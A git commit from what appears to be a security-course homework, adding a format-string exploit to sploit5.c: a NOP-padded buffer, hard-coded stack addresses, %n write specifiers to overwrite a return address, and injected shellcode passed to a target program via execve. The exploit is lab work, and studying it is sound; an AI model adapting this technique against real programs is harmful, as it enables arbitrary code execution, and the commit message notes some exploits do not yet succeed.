4498aaecdc968a9ce317de4a5dfc74e6e7e8e0e1
peggy1239 <[lpg0718bc@gmail.com]>
2021-11-18 00:53:35 -0600

    1,3,5 not success yet...

--- HW4/sploits/sploit5.c
+++ HW4/sploits/sploit5.c
@@ -8,10 +8,37 @@
 
 int main(void)
 {
+  int i;
   char *args[3];
   char *env[1];
+  char buf[480];
+  memset(buf, 0x90, 480);
+  
+  /* return to arg ver */
+  char* tmp = 
+  "\x7c\xf4\xff\xbf\xff\xff\xff\xff"
+  "\x7d\xf4\xff\xbf\xff\xff\xff\xff"
+  "\x7e\xf4\xff\xbf\xff\xff\xff\xff"
+  "\x7f\xf4\xff\xbf\xff\xff\xff\xff"
+  "%04x%08x%17u%n%189u%n%5u%n%192u%n";
 
-  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
+  strncpy(buf,tmp,strlen(tmp));
+  
+  /* return to buf ver */
+  // char* tmp = 
+  // "\x7c\xf4\xff\xbf\xff\xff\xff\xff"
+  // "\x7d\xf4\xff\xbf\xff\xff\xff\xff"
+  // "\x7e\xf4\xff\xbf\xff\xff\xff\xff"
+  // "\x7f\xf4\xff\xbf\xff\xff\xff\xff"
+  // "%04x%08x%212u%n%244u%n%7u%n%188u%n";
+
+  // strncpy(buf,tmp,strlen(tmp));
+
+  strncpy(buf+400, shellcode, 45);
+
+  args[0] = TARGET; 
+  args[1] = buf;
+  args[2] = NULL;
   env[0] = NULL;
 
   if (0 > execve(TARGET, args, env))
